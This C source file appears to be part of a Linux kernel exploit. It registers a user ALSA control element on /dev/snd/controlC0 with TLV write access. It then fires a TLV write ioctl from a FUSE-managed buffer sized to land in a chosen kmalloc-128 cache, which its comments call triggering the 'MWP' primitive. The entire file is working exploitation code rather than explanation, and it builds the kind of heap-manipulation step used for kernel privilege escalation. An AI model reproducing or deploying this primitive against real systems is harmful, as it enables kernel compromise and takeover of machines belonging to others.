#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>
#include "snd_mwp.h"

static int snd_card_fd;
static int kctl_numid;

void init_audio() 
{
    snd_card_fd = open("/dev/snd/controlC0", O_RDONLY);
    assert(snd_card_fd > 0); 

    struct snd_ctl_elem_info info = {0};
    strlcpy((char *)info.id.name, "FarmaMed", sizeof("FarmaMed"));
    info.id.numid = 69;

    info.count = 1;

    // This should be fine to go through snd_ctl_check_elem_info
    info.type = SNDRV_CTL_ELEM_TYPE_INTEGER;

    // This should be fine to set the kctl->tlv.c to snd_ctl_elem_user_tlv
    info.access = SNDRV_CTL_ELEM_ACCESS_TLV_WRITE;

    int ret = ioctl(snd_card_fd, SNDRV_CTL_IOCTL_ELEM_ADD, &info);
    assert(ret >= 0);

    // Kernel does copy_to_user of the updated info data
    kctl_numid = info.id.numid;
}

void trigger_mwp(void *fuse_managed_memory)
{
    printf("[+][%s]", __func__ );
    struct snd_ctl_tlv *buf = fuse_managed_memory; 
    buf->numid = kctl_numid;
    
    // This should be the allocation size for the kmalloc-cache
    // from which we want to allocate
    buf->length = 128;
    printf("[+][%s] MWP about to be triggered...", __FILE__);

    // This should call kctl->tlv.c to snd_ctl_elem_user_tlv,
    // that function will call replace_user_tlv thanks to the WRITE operation
    int ret = ioctl(snd_card_fd, SNDRV_CTL_IOCTL_TLV_WRITE, buf);
    assert(ret >= 0);

}

